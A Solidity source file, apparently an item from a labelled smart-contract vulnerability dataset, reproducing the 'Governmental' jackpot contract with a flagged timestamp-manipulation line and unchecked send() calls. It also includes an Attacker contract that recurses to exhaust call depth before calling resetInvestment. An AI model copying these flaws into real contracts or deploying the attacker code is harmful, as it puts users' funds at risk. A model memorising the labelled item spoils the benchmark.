/*
 * @source: http://blockchain.unica.it/projects/ethereum-survey/attacks.html#governmental
 * @author: -
 * @vulnerable_at_lines: 27
 */

//added pragma version
pragma solidity >=0.7.0;

contract Governmental {
  address public owner;
  address public lastInvestor;
  uint public jackpot = 1 ether;
  uint public lastInvestmentTimestamp;
  uint public ONE_MINUTE = 1 minutes;

  constructor() payable {
    owner = msg.sender;
    if (msg.value<1 ether) revert();
  }

  function invest() public payable {
    if (msg.value<jackpot/2) revert();
    lastInvestor = msg.sender;
    jackpot += msg.value/2;
    // <yes> <report> TIME_MANIPULATION
    lastInvestmentTimestamp = block.timestamp;
  }

  function resetInvestment() public {
    if (block.timestamp < lastInvestmentTimestamp+ONE_MINUTE)
      revert();

    payable(lastInvestor).send(jackpot);
    payable(owner).send(address(this).balance-1 ether);

    lastInvestor = address(0);
    jackpot = 1 ether;
    lastInvestmentTimestamp = 0;
  }
}

contract Attacker {

  function attack(address target, uint count) public {
    if (0<=count && count<1023) {
      this.attack{gas: gasleft()-2000}(target, count+1);
    }
    else {
      Governmental(target).resetInvestment();
    }
  }
}
